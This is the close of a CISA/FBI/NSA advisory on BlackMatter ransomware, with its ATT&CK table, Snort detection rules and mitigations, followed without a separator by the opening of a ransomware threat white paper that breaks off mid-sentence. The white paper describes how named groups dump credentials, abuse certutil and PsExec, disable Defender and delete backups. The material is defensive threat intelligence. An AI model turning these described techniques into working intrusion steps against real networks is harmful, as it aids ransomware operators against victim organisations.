\n\nhttps://www.virustotal.com/gui/file/706f3eec328e91ff7f66c8f0a2fb9b556325c153a329a2062dc85879c540839d\nhttps://attack.mitre.org/versions/v9/tactics/TA0003/\nhttps://attack.mitre.org/versions/v9/techniques/T1133/\n\n\n3/8\n\nTactic Technique Procedure \n\nCredential\nAccess\n[TA0006]\n\nOS Credential Dumping:\nLSASS Memory [T1003.001]\n\nBlackMatter harvests credentials from\nLocal Security Authority Subsystem\nService (LSASS) memory using procmon.\n\nDiscovery\n[TA0007]\n\nRemote System Discovery\n[T1018]\n\nBlackMatter leverages LDAP and SMB\nprotocol to discover all hosts in the AD.\n\nProcess\nDiscovery\n[T1057]\n\nBlackMatter uses\nNtQuerySystemInformation\n\nto enumerate running\nprocesses.\n\nSystem\nService\nDiscovery\n[T1007]\n\nBlackMatter uses\nEnumServicesStatusExW  to\n\nenumerate running services on\nthe network.\n\nLateral\nMovement\n[TA0008]\n\nRemote Services:\nSMB/Windows Admin Shares\n[T1021.002]\n\nBlackMatter uses\nsrvsvc.NetShareEnumAll  MSRPC\n\nfunction to enumerate and SMB to connect\nto all discovered shares, including\nADMIN$ , C$ , SYSVOL , and NETLOGON .\n\nExfiltration\n[TA0010]\n\nExfiltration Over Web Service\n[T1567]\n\nBlackMatter attempts to exfiltrate data for\nextortion.\n\nImpact\n[TA0040]\n\nData Encrypted for Impact\n[T1486]\n\nBlackMatter remotely encrypts shares via\nSMB protocol and drops a ransomware\nnote in each directory.\n\nDisk Wipe\n[T1561]\n\nBlackMatter may wipe backup\nsystems.\n\nDetection Signatures\n\nThe following Snort signatures may be used for detecting network activity associated with\nBlackMatter activity.\n\nIntrusion Detection System Rule:\n\nhttps://attack.mitre.org/versions/v9/tactics/TA0006/\nhttps://attack.mitre.org/versions/v9/techniques/T1003/001/\nhttps://attack.mitre.org/versions/v9/tactics/TA0007/\nhttps://attack.mitre.org/versions/v9/techniques/T1018/\nhttps://attack.mitre.org/techniques/T1057\nhttps://attack.mitre.org/versions/v9/techniques/T1007/\nhttps://attack.mitre.org/versions/v9/tactics/TA0008/\nhttps://attack.mitre.org/versions/v9/techniques/T1021/002/\nhttps://attack.mitre.org/versions/v9/tactics/TA0010/\nhttps://attack.mitre.org/versions/v9/techniques/T1567/\nhttps://attack.mitre.org/versions/v9/tactics/TA0040/\nhttps://attack.mitre.org/versions/v9/techniques/T1486/\nhttps://attack.mitre.org/versions/v9/techniques/T1561/\n\n\n4/8\n\nalert tcp any any -> any 445 ( msg:\"BlackMatter remote encryption attempt\";\n content:\"|01 00 00 00 00 00 05 00 01 00|\";  content:\"|2e 00 52 00 45 00 41\n00 44 00 4d 00 45 00 2e 00 74 00|\"; distance:100; detection_filter: track\nby_src, count 4, seconds 1; priority:1; sid:11111111111; )\n\nInline Intrusion Prevention System Rule:\n\nalert tcp any any -> any 445 ( msg:\"BlackMatter remote encryption attempt\";\n content:\"|01 00 00 00 00 00 05 00 01 00|\";  content:\"|2e 00 52 00 45 00 41\n00 44 00 4d 00 45 00 2e 00 74 00|\"; distance:100; priority:1; sid:10000001;\n)\n\nrate_filter gen_id 1, sig_id 10000001, track by_src, count 4, seconds 1,\nnew_action reject, timeout 86400\n\nMitigations\n\nCISA, the FBI, and NSA urge network defenders, especially for critical infrastructure\norganizations, to apply the following mitigations to reduce the risk of compromise by\nBlackMatter ransomware:\n\nImplement Detection Signatures\n\nImplement the detection signatures identified above. These signatures will identify\nand block placement of the ransom note on the first share that is encrypted,\nsubsequently blocking additional SMB traffic from the encryptor system for 24 hours. \n\nUse Strong Passwords\n\nRequire all accounts with password logins (e.g., service account, admin\naccounts, and domain admin accounts.) to have strong, unique passwords.\nPasswords should not be reused across multiple accounts or stored on the system\nwhere an adversary may have access. Note: devices with local administrative\naccounts should implement a password policy that requires strong, unique passwords\nfor each individual administrative account. \n\nImplement Multi-Factor Authentication\n\nRequire multi-factor authentication for all services to the extent possible, particularly\nfor webmail, virtual private networks, and accounts that access critical systems.\n\nPatch and Update Systems\n\nKeep all operating systems and software up to date. Timely patching is one of the\nmost efficient and cost-effective steps an organization can take to minimize its\nexposure to cybersecurity threats.\n\nLimit Access to Resources over the Network\n\nhttps://www.us-cert.cisa.gov/ncas/tips/ST04-002\nhttps://us-cert.cisa.gov/ncas/tips/ST05-012\n\n\n5/8\n\nRemove unnecessary access to administrative shares, especially ADMIN$  and\nC$ . If ADMIN$  and C$  are deemed operationally necessary, restrict privileges to\n\nonly the necessary service or user accounts and perform continuous monitoring for\nanomalous activity.\nUse a host-based firewall to only allow connections to administrative shares via SMB\nfrom a limited set of administrator machines. \n\nImplement Network Segmentation and Traversal Monitoring\n\nAdversaries use system and network discovery techniques for network and system visibility\nand mapping. To limit an adversary from learning the organization’s enterprise environment,\nlimit common system and network discovery techniques by taking the following actions.\n\nSegment networks to prevent the spread of ransomware. Network segmentation can\nhelp prevent the spread of ransomware by controlling traffic flows between—and\naccess to—various subnetworks and by restricting adversary lateral movement. \nIdentify, detect, and investigate abnormal activity and potential traversal of the\nindicated ransomware with a networking monitoring tool. To aid in detecting the\nransomware, implement a tool that logs and reports all network traffic, including lateral\nmovement activity on a network. Endpoint detection and response (EDR) tools are\nparticularly useful for detecting lateral connections as they have insight into common\nand uncommon network connections for each host. \n\nUse Admin Disabling Tools to Support Identity and Privileged Access Management\n\nIf BlackMatter uses compromised credentials during non-business hours, the compromise\nmay not be detected. Given that there has been an observed increase in ransomware\nattacks during non-business hours, especially holidays and weekends, CISA, the FBI, and\nNSA recommend organizations:\n\nImplement time-based access for accounts set at the admin-level and higher. For\nexample, the Just-in-Time (JIT) access method provisions privileged access when\nneeded and can support enforcement of the principle of least privilege (as well as the\nZero Trust model). This is a process where a network-wide policy is set in place to\nautomatically disable admin accounts at the AD level when the account is not in direct\nneed. When the account is needed, individual users submit their requests through an\nautomated process that enables access to a system, but only for a set timeframe to\nsupport task completion. \nDisable command-line and scripting activities and permissions. Privilege\nescalation and lateral movement often depend on software utilities that run from the\ncommand line. If threat actors are not able to run these tools, they will have difficulty\nescalating privileges and/or moving laterally. \n\nImplement and Enforce Backup and Restoration Policies and Procedures\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-243a\nhttps://www.cyberark.com/what-is/just-in-time-access/#:~:text=JIT%20Access%20Explained%20Using%20the%20just-in-time%20%28JIT%29%20access,system%20in%20order%20to%20perform%20a%20necessary%20task\n\n\n6/8\n\nMaintain offline backups of data, and regularly maintain backup and restoration. This\npractice will ensure the organization will not be severely interrupted, have irretrievable\ndata, or be held up by a ransom demand.\nEnsure all backup data is encrypted, immutable (i.e., cannot be altered or deleted)\nand covers the entire organization’s data infrastructure. \n\nCISA, the FBI, and NSA urge critical infrastructure organizations to apply the following\nadditional mitigations to reduce the risk of credential compromise.\n\nDisable the storage of clear text passwords in LSASS memory.\nConsider disabling or limiting New Technology Local Area Network Manager\n(NTLM) and WDigest Authentication.\nImplement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft:\nManage Windows Defender Credential Guard for more information). For Windows\nServer 2012R2, enable Protected Process Light for Local Security Authority (LSA). \nMinimize the AD attack surface to reduce malicious ticket-granting activity. Malicious\nactivity such as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service\nand can be used to obtain hashed credentials that attackers attempt to crack.\n\nSet a strong password policy for service accounts.\nAudit Domain Controllers to log successful Kerberos Ticket-Granting Service\nrequests and ensure the events are monitored for anomalous activity.  \n\nRefer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware\nGuide for general mitigations to prepare for and reduce the risk of compromise by\nransomware attacks. \n\nNote: critical infrastructure organizations with industrial control systems/operational\ntechnology networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A:\nDarkSide Ransomware: Best Practices for Preventing Business Disruption from\nRansomware Attacks for more mitigations, including mitigations to reduce the risk of severe\nbusiness or functional degradation should their entity fall victim to a ransomware attack. \n\nResponding to Ransomware Attacks\n\nIf a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend:\n\nFollowing the Ransomware Response Checklist on p. 11 of the CISA-Multi-State\nInformation Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.\nScanning backups. If possible, scan backup data with an antivirus program to check\nthat it is free of malware.\nReporting incidents immediately to the FBI at a local FBI Field Office, CISA at us-\ncert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office. \n\nhttps://www.dataversity.net/how-to-survive-a-ransomware-attack-five-backup-best-practices/\nhttps://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage\nhttps://www.us-cert.cisa.gov/ncas/tips/ST04-002\nhttps://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C_.pdf\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-131a\nhttps://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C_.pdf\nhttps://www.fbi.gov/contact-us/field-offices\nhttps://us-cert.cisa.gov/report\nhttp://www.secretservice.gov/contact/field-offices/\n\n\n7/8\n\nApplying incident response best practices found in the joint Advisory, Technical\nApproaches to Uncovering and Remediating Malicious Activity, developed by CISA and\nthe cybersecurity authorities of Australia, Canada, New Zealand, and the United\nKingdom.\n\nNote: CISA, the FBI, and NSA strongly discourage paying a ransom to criminal actors.\nPaying a ransom may embolden adversaries to target additional organizations, encourage\nother criminal actors to engage in the distribution of ransomware, and/or may fund illicit\nactivities. Paying the ransom also does not guarantee that a victim’s files will be recovered.\n\nResources\n\nFor more information and resources on protecting against and responding to\nransomware, refer to StopRansomware.gov, a centralized, whole-of-government\nwebpage providing ransomware resources and alerts.\nCISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment\nbased on a tiered set of practices to help organizations better assess how well they are\nequipped to defend and recover from a ransomware incident. \nCISA offers a range of no-cost cyber hygiene services to help critical infrastructure\norganizations assess, identify, and reduce their exposure to threats, including\nransomware. By requesting these services, organizations of any size could find ways to\nreduce their risk and mitigate attack vectors.\n\nContact Information\n\nVictims of ransomware should report it immediately to CISA at us-cert.cisa.gov/report, a local\nFBI Field Office, or U.S. Secret Service Field Office.

Major ransomware attacks \nprompting multi-million dollar ransom payouts have attracted a growing \nnumber of malicious actors into the ransomware space. \n\nOver the past year, ransomware attackers have grown increasingly \nambitious and have mounted a number of high-profile, extremely \ndestructive attacks. The attack against Colonial Pipeline in the U.S. in May \n2021 caused significant disruption and prompted concerns about the \nnation’s fuel supplies. In the same month, an attack on Ireland’s national \nhealth service, the Health Service Executive, forced it to cancel thousands \nof appointments. In the middle of a global pandemic, staff had to keep \npaper records as computers were kept offline until the network was \ncleaned up. \n\nWhile these attacks paint a picture of ransomware gangs operating with \nimpunity, the disruption they caused did have a political impact, with U.S. \nPresident Joe Biden urging his Russian counterpart Vladimir Putin to rein in \nransomware attackers, many of whom are believed to be located in Russia.\n\nTable of Contents\nIntroduction\n\nRansomware Trends\n\nCompounding the Threat: \nRansomware-as-a-Service\n\nCase Study: Shifting Allegiances \nAmong Affiliates\n\nRansomware Threat Actors\nMiner\n\nCase Study: Social Engineering \nElement in BazarLoader Attacks\n\nLeafroller\n\nHispid\n\nThysanura\n\nSyrphid\n\nSnakefly\n\nCoreid\n\nCase Study: Hornworm \nCollaboration with FIN8\n\nHornworm\n\nLeaftier\n\nLeaffolder\n\nCanthroid\n\nTools, Tactics, and Procedures\n\nInfection Vectors\nSecondary Infections\n\nCase Study: Ransomware Supply \nChain Attack\n\nMalvertising\n\nVulnerability Exploitation\n\nPoorly Secured Services\n\nProtection\n\nMitigation\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nThe glare of publicity surrounding such high-profile attacks and subsequent law enforcement operations is believed \nto have contributed to the disappearance of some of the more active ransomware threats during 2021, include \nDarkside, Sodinokibi (aka REvil), and Egregor. \n\nWhile the departure of any threat is always a welcome development, it should not be assumed that ransomware \nactivity will diminish. Frequently, attackers who have departed the scene will re-emerge with a new toolset, while \nnew attackers will emerge trying to take the market space occupied by departing players. Any change in the threat \nlandscape means that there’s a period of uncertainty where network defenders aren’t aware of who the big players \nare going to be and what tactics they are going to use. \n\nTwo trends are a particular source of concern. Although the phenomenon of ransomware-as-a-service (RaaS) is not \nnew, its increasing adoption as part of the operations of most major ransomware developers has contributed to the \nproliferation of targeted ransomware attacks. Not only does RaaS prompt more attacks, but it also multiplies the \nnumber of tools, tactics, and procedures (TTPs) being employed to deliver ransomware. Each ransomware threat \ncould be delivered by one of multiple different threat actors, many of whom will use differing TTPs. RaaS has also \nlowered the entry barriers for less skilled actors to enter the arena, adding to the number of attackers.\n\nSecondly, a growing a number of ransomware operators are collaborating with other malware developers, most \nnotably financial fraud botnets, to gain access to victims. Major botnets often have a vast reach and can potentially \noffer ransomware gangs a deep pool of potential victims from which to fish from. \n\nRansomware groups are now sophisticated threat actors, capable of building relationships with other attackers in \norder to further their reach and employing an evolving array of tools and tactics in order to make their attacks more \neffective. Successfully defending against ransomware attacks now requires defense in depth from organizations, \nalong with a deep understanding of how these attacks unfold. \n\nRansomware Trends\nOver the past number of years, there has been a marked shift in the ransomware threat landscape and that trend \nhas continued in recent times. In the past 18 months, the total number of ransomware attacks detected and blocked \nby Symantec has almost halved, from 9,116 in January 2020 to 4,692 in June 2021.\n\nFigure 1: All Ransomware Detections January 2020 to June 2021\n\n0\n\n1,000\n\n2,000\n\n3,000\n\n4,000\n\n5,000\n\n6,000\n\n7,000\n\n8,000\n\n9,000\n\n10,000\n\nJunMayAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nWhile any reduction in ransomware activity is to be welcomed, the overall decline in numbers is accounted for by \nthe ongoing decline of relatively unsophisticated, indiscriminate attacks. A growing number of threat actors are \nnow focusing on targeted ransomware attacks, where a single organization at a time is attacked and the attackers \nattempt to encrypt as many computers as possible on the network in the hope of extracting a high-value ransom. \nAlthough relatively small in number, these attacks are far more damaging to organizations than indiscriminate \nattacks, where usually only a small number of computers may be affected.\n\nFigure 2: Number of Organizations Affected by Targeted Ransomware Attacks, January 2020 to June 2021\n\n0\n\n50\n\n100\n\n150\n\n200\n\n250\n\nJunMayAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nThe statistics for targeted attacks tell a different story, with the number of organizations affected by targeted \nransomware attacks up by 83% over the past 18 months, from 81 in January 2020 to 148 in June 2021. The real \nnumber of targeted ransomware attacks is much higher. Some ransomware families have been deployed via spam \ncampaigns in addition to being used in targeted attacks. There is no way of establishing how many victims of these \nthreats were infected by targeted attacks and how many were infected through other means, meaning they cannot \nbe counted among targeted attacks.\n\nIn addition to this, confirmed attacks from known targeted ransomware families are probably only a representative \nsample of the overall number of attacks involving these threats. Many targeted ransomware attacks are halted \nbefore payload deployment, meaning they may not be identified as ransomware. In addition, most targeted \nransomware operators recompile their ransomware for every new attack. This means that the variant of the \nransomware used in an attack may be blocked by a generic or machine learning-generated detection signature \nrather than a detection linked to that ransomware family.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nFigure 3: Number of Organizations Affected by Targeted Ransomware Attacks, by Family, January 2020 to June 2021.\n\nAvaddon Babuk\n\nBlackKingdom Clop Coldlock Conti Darkside Dearcry Egregor Exx\n\nGoGalocker Lockbit Matrix Maze Mega Cortex Netwalker Prolock RagnarLocker\n\nRobbinhood Ryuk Sodinokibi Thieflock Wastedlocker Bitpaymer\n\n250\n\n0\n\n50\n\n100\n\n150\n\n200\n\nJunMayAprMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nWhen targeted attacks are broken down by ransomware family, two trends become apparent. Firstly, the profusion \nof new threats has continued and is contributing to the overall increase in attacks. Of the 24 groups analyzed, nine \nwere active in January 2020, but 13 were active in June 2021. Secondly, a small number of prolific threat actors such \nas Ryuk, Sodinokibi, and, more recently, Avaddon, have accounted for a large proportion of attacks.\n\nAgain, it should be stressed that these statistics should be treated as a representative sample of attacks blocked by \nSymantec. The majority of attacks are likely to be blocked at the pre-ransomware deployment stage or before they \ncan be associated with any particular family of ransomware.\n\n \n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nFigure 4: Overall Number of Ransomware Detections by Country, January 2020 to June 2021\n\n0 1,000 2,000 3,000 4,000 5,000 6,000 7,000 8,000 9,000 10,000 11,000 12,000 13,000 14,000 15,000\n\nZimbabwe\n\nRussia\n\nItaly\n\nBotswana\n\nZambia\n\nIndonesia\n\nNigeria\n\nJapan\n\nAlgeria\n\nUK\n\nCongo\n\nGermany\n\nTurkey\n\nCameroon\n\nEthiopia\n\nSouth Africa\n\nIndia\n\nChina\n\nUS\n\n8,576\n\n997\n\n1,018\n\n1,023\n\n1,040\n\n1,045\n\n1,168\n\n1,197\n\n1,710\n\n1,760\n\n1,924\n\n2,062\n\n2,424\n\n2,795\n\n3,310\n\n5,398\n\n5,965\n\n13,189\n\n13,627\n\nAnother key trend emerges when examining the location of ransomware victims. While the U.S. is the most \nfrequently attacked country, ransomware attacks in general are quite commonplace worldwide, with a notable \nnumber of African countries appearing in the top 20 over the past 18 months. The presence of Africa on the list \nis largely accounted for by the fact that it appears to be a particular focus for attackers mounting indiscriminate \nransomware attacks, such as through spam email campaigns or exploits of known vulnerabilities. \n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nFigure 5: Number of Targeted Ransomware Detections by Country, January 2020 to June 2021\n\n0 500 1,000 1,500 2,000 2,500 3,000 3,500 4,000 4,500 5,000 5,500\n\nThailand\n\nArgentina\n\nSingapore\n\nBrazil\n\nSouth Africa\n\nSouth Korea\n\nSaudi Arabia\n\nIreland\n\nAustralia\n\nMexico\n\nFrance\n\nCanada\n\nGermany\n\nIndia\n\nChina\n\nUK\n\nPhilipines\n\nTurkey\n\nUS\n\n395\n\n76\n\n84\n\n87\n\n93\n\n101\n\n110\n\n112\n\n123\n\n129\n\n146\n\n184\n\n243\n\n258\n\n273\n\n277\n\n342\n\n455\n\n5,174\n\nA very different picture emerges when analyzing only targeted ransomware attacks. The U.S. is by far the most \naffected country, with more than 11 times more attacks over the past 18 months than the next most affected \ncountry (Turkey). \n\nThe concentration of victims in the U.S. is not surprising. As a large, affluent nation with a highly developed \nbusiness sector, it is naturally a prime target for targeted ransomware attacks. Several ransomware gangs are on \nrecord as saying they mostly, if not exclusively, targeted organizations in the U.S.\n\nWhile it may be a surprise that Turkey and the Philippines also figure prominently, it is consistent with previous \nyears’ statistics, where both also featured in the top five.\n\nIt should be noted that unlike targeted ransomware stats listed earlier that counted the number of organizations, \nthis statistic represents a count of computers on which a targeted ransomware family was detected. When \nanalyzing attacks by geographical region, a different methodology needs to be employed since many victims of \ntargeted ransomware have operations in more than one country. \n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nCompounding the Threat: Ransomware-as-a-Service\nA key factor in driving the threat posed by ransomware was the advent of ransomware-as-a-service (RaaS). While a \nsuccessful targeted ransomware attack can be devastatingly effective, one of the drawbacks it has for the attacker \nis that it can be quite labor intensive. The various steps involved in a typical attack, including credential theft, \nprivilege escalation, lateral movement, data exfiltration, deletion of backups, and payload deployment often require \nactive participation on the part of the attacker. Consequently, the number of attacks a ransomware actor can \nperform is limited by their available workforce. \n\nSuccessful ransomware authors realized that they could boost their revenues by recruiting other attackers, known \nas affiliates, and provide them with access to their tools in exchange for a cut of the ransom payment. This business \nmodel is now highly developed and most of the high-profile targeted ransomware developers operate some kind of \nRaaS program.\n\nThe available evidence suggests that there are varying types of affiliate relationships, but the basic template \ncurrently involves ransomware authors offering access to the ransomware itself, hosting for breached data, and \nhandling of ransom negotiations. In some cases, it’s been reported that ransomware developers provide an entire \nplaybook for affiliates. However, often affiliates will use their own TTPs. Symantec has frequently seen actors using \nthe same TTPs but different payloads over time. There is also some evidence of actors being affiliated to more than \none ransomware developer at the same time (see Case Study: Shifting allegiances among affiliates).\n\nWhile some ransomware developers appear to solely work under the RaaS business model, others are more hands-\non and will continue to mount attacks themselves. The nature of what’s required from affiliates may also vary. \nSeveral have been observed advertising for “access brokers”, suggesting that they’re simply looking for a means of \nentry to potential victim networks and will to carry out the rest of the attacks themselves. \n\nThe advent of affiliates makes the ransomware threat landscape more complex for network defenders, since each \nransomware threat could be delivered by one of multiple different threat actors, many of whom will use differing \nTTPs.\n\nCase Study: Shifting Allegiances Among Affiliates\n\nMost ransomware affiliates appear not to be \nexclusively tied to a single ransomware developer. \nWhen a ransomware developer goes offline or retires, \nmany of their affiliates will move to another RaaS \noperator.\n\nFor example, when the Leafroller (aka REvil) group \nsuddenly took its Sodinokibi ransomware operation \noffline in early July 2021, it appears that some of \nits affiliates moved to rival operations. Following \nSodinokibi’s disappearance, attacks involving \nLockBit have increased notably, and Symantec found \nevidence that at least one former Sodinokibi affiliate \nwas now using LockBit. This attacker used consistent \nTTPs to deliver Sodinokibi to victims until July of \n\n2021, at which point the payload switched to LockBit. \n\nAttacks from this actor begin with a file named \nmimi.exe, which is an installer that drops a number \nof password-dumping tools. Immediately prior to \nthe ransomware being launched, a large number of \ncommands are executed to disable various services, \nblock access to Remote Desktop Protocol (RDP), \ndelete shadow copies etc. This actor consistently \nnames their ransomware payload as “svhost.exe” \nand this practice has been maintained following their \ntransition to LockBit.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nRansomware Threat Actors\n\nMiner\n\nAliases: Wizard Spider \n\nRansomware families: Ryuk, Conti, GoGalocker (inactive), MegaCortex (inactive) \n\nActive since: 2014\n\nMiner is believed to be active since at least June 2014 when it began using the Dyre banking Trojan in financial \nfraud campaigns. Dyre became inactive in November 2015, but a new financial Trojan known as Trickbot appeared \nin September 2016. It was subsequently linked to the Miner group because Trickbot and Dyre appeared to share \ncommon authorship. \n\nTrickbot was originally developed as a financial Trojan capable of performing man-in-the-browser (MitB) attacks to \nintercept online transactions when victims are using online banking applications. It has since been repurposed for \nuse as a credential stealer and acting as a distribution channel for other malware.\n\nMiner also introduced new malware known as BazarLoader and BazarBackdoor in April 2020. Like Trickbot, \nBazarLoader is spread through spam email campaigns and can deliver the second-stage BazarBackdoor payload. \nUnlike Trickbot, the Bazar family appears to have been primarily developed for malware distribution. \n\nDuring 2018, the group branched out into targeted ransomware, using the Ryuk ransomware. Ryuk is based on the \nolder Hermes ransomware family, which it appears to have acquired from the original developer.\n\nRyuk attacks have frequently employed both Trickbot and the Emotet botnets as infection vectors. Publicly \navailable malware such as Cobalt Strike and Metasploit are then used to enumerate the network for lateral \nmovement and increase privileges. Once this step is completed, the attackers gain administrative access to domain \ncontrollers. The attackers then use batch files, deployed via PsExec, to disable and delete backup/restoration \ncapabilities and security services throughout the environment. \n\nDuring 2019, Miner began using two new ransomware families, GoGalocker (aka LockerGoga) and MegaCortex. \nBoth shared code with Ryuk and analysis by Symantec found that there was overlap in the command and control \n(C&C) infrastructure used by all three ransomware families. Attacks involving GoGalocker and MegaCortex ceased \nin early 2020.\n\nMiner was then linked to the Conti ransomware, which first appeared in December 2019. There has been some \nspeculation that Conti was created specifically for use by affiliates, under the RaaS model, but this remains \nunconfirmed.\n\nBoth Ryuk and Conti have been distributed using very similar TTPs. A May 2021 investigation by Symantec found \nsignificant overlap in tools used to deliver both. The attacks involved extensive use of variants of Cobalt Strike. In \nsome cases, the infection vector appears to be via the IcedID malware, which delivers malware known as Longlist, \nwhich in turn is used to install Cobalt Strike.\n\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nCase Study: Social Engineering Element in BazarLoader Attacks\n\nA recent attack campaign involving the Miner group’s \nBazarLoader malware saw the attackers employ \na degree of social engineering in order to push \nmalware on to the victim’s network. The campaign \ntargeted a number of large organizations during July \n2021 and began with the appearance of a malicious \nExcel file on one computer on the victim’s network.\n\nWhile the initial infection vector was not confirmed in \nall cases, in one organization the attack began when \na spear-phishing email was sent to an employee. The \nemail alleged that the recipient had been involved \nin a recent car accident and a claim had been made \nagainst their motor insurance. They were given a \nnumber to call for further information. The email \nwas convincing enough for the employee to call the \nnumber. The subsequent phone call directed them to \na URL. This URL led to the download of a malicious \nExcel file. \n\nThe tactic of using a phone call to get the target to \ndownload a suspicious file is a bid to avoid detection. \nA suspicious attachment or link in an email from an \nunknown sender is likely to either be automatically \n\nblocked by security software or raise the suspicions \nof the recipient. A URL that is manually entered by an \nend-user may not be as likely to raise red flags.\n\nThe attackers created a new directory on the \ncompromised computer and copied Certutil to it \nunder a new name: \n\nCSIDL_COMMON_APPDATA\\epvv2e\\epvv2e.exe\n\nThis masquerading technique was previously used in \nthe Kaseya attack and is intended to hide malicious \nuse of Certutil. \n\nCertutil is used to download a malicious DLL file. \nThis was identified as BazarLoader. Symantec did \nnot observe the attackers successfully deploying \na payload. However, the association of these TTPs \nwith previous ransomware attacks suggests a strong \npossibility of early-stage ransomware activity, most \nlikely involving Ryuk.\n\nLeafroller\n\nAliases: REvil \n\nRansomware families: Sodinokibi (inactive), Gandcrab (inactive) \n\nActive since: 2018\n\nLeafroller conducted targeted ransomware attacks using the Sodinokibi ransomware between April 2019 and July \n2021. The group is known to work with affiliates, using the RaaS model. Like many ransomware groups, Leafroller \nand its affiliates routinely steal victim data prior to encryption and then post a sample to publicly available \nwebsites. The attackers then attempt to apply further pressure to extort the victim by threatening to post sensitive \ninformation if they don’t pay the ransom.\n\nPrior to creating Sodinokibi, the group was involved in attacks involving an older strain of ransomware Gandcrab, \nhaving acquired its source code from the original developer. Some of the affiliates it shared Gandcrab with \ncontinued with the group when it transitioned to Sodinokibi. \n\nLeafroller is known for targeting high-profile organizations to maximize the amount of ransom they can extort. \nOne of its most notable victims was Travelex, a foreign exchange service, which was attacked in January 2020 and \ngenerated a $2.3 million ransom for the ransomware operators. \n\nLeafroller also has a reputation for frequently trialing new TTPs. During 2020, it was observed scanning victim \nnetworks for credit card or point of sale (POS) software.  It was not clear if the attackers were targeting this \nsoftware for encryption or data theft. In July 2021, Sodinokibi was used in a novel ransomware supply chain attack \ninvolving Kaseya software (see Case Study: Ransomware supply chain attack). \n\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/kaseya-ransomware-supply-chain\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/kaseya-ransomware-supply-chain\nhttps://www.bleepingcomputer.com/news/security/travelex-reportedly-paid-23-million-ransom-to-restore-operations/\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/sodinokibi-ransomware-cobalt-strike-pos\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/sodinokibi-ransomware-cobalt-strike-pos\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/kaseya-ransomware-supply-chain\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/kaseya-ransomware-supply-chain\n\n\nThe Ransomware Threat\n\nWhite Paper\n\nLess than two weeks after the Kaseya attack, infrastructure and websites belonging to Leafroller went \noffline. Both dark net and clear net infrastructure associated with the group was affected, including ransom \nnegotiation websites, data breach websites, and C&C servers. The reason for the group’s disappearance remains \nunclear. However, at the time of writing, there has been no evidence of new Sodinokibi activity. \n\nHispid\n\nAliases: EvilCorp, Indrik Spider, TA505 \n\nRansomware families: BitPaymer (retired), DoppelPaymer, WastedLocker, Hades, Phoenix Locker \n\nActive since: 2011\n\nHispid are veteran cyber crime actors, active since approximately 2011. The group was originally involved in financial \nfraud, having been responsible for the Dridex banking Trojan. At its height, Dridex was one of the most prolific \ncyber crime threats, being distributed in massive spam runs that went to millions of email addresses. \n\nAt some point around 2017, the group shifted its focus to targeted ransomware, introducing the BitPaymer \nransomware family. It later introduced a second ransomware family known as DoppelPaymer which was based \naround the same code, albeit with some minor differences. It has been reported that DoppelPaymer was developed \nfor use by affiliates, but Symantec has not been able to confirm this. \n\nIn a similar fashion to how Miner continued to use Trickbot, Hispid continued to use Dridex for a time after its move \nto ransomware, repurposing the malware for use as a precursor tool in ransomware attacks. \n\nIn December 2019, two Russian nationals were indicted on multiple charges in the U.S. relating to the group’s \nactivities. A $5 million reward was offered for information leading to their arrest or conviction. \n\nIn May 2020, Hispid retooled and introduced a new family of ransomware known as WastedLocker. Attacks began \nwith a malicious JavaScript-based framework known as SocGholish which masquerades as a software update. An \ninvestigation by Symantec in June 2020 found SocGholish on more than 150 compromised websites, including \ndozens of U.S. newspaper websites.\n\nOnce the attackers had a foothold on the victim’s network, PowerShell was used to download and execute a loader. \nThe loader contained a .NET injector along with a loader for Cobalt Strike Beacon.\n\nCobalt Strike Beacon can be used to execute commands, inject other processes, elevate current processes, or \nimpersonate other processes, and upload and download files. The Get-NetComputer command from PowerView \nwas renamed by the attackers to a random name. This command then searched for all the computer objects in the \nActive Directory database.\n\nPrivilege escalation was performed using a publicly documented technique involving the Software Licensing \nUser Interface tool (slui.exe), a Windows command line utility that is responsible for activating and updating the \nWindows operating system.\n\nThe attackers used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute \ncommands on remote computers, such as adding a new user or executing additional downloaded PowerShell \nscripts. Cobalt Strike was also used to carry out credential dumping using ProcDump and to empty log files.\n\nIn order to deploy the ransomware, the attackers used the Windows Sysinternals tool PsExec to launch a legitimate \ncommand line tool for managing Windows Defender (mpcmdrun.exe) to disable scanning of all downloaded files \nand attachments, remove all installed definitions, and, in some cases, disable real-time monitoring.\n\nPsExec was then used to launch PowerShell, which used the win32_service WMI class to retrieve services and the \nnet stop command to stop these services. After Windows Defender was disabled and services had been stopped \nacross the organization, PsExec was used to launch the WastedLocker ransomware itself, which then began \nencrypting data and deleting shadow volumes.\n\nIn March 2021, the group introduced a new variant of ransomware dubbed Hades, which had significant code \noverlap with WastedLocker. It is likely that Hispid developed the Hades ransomware in response to sanctions \nimposed by the U.S. Treasury Department’s Office of 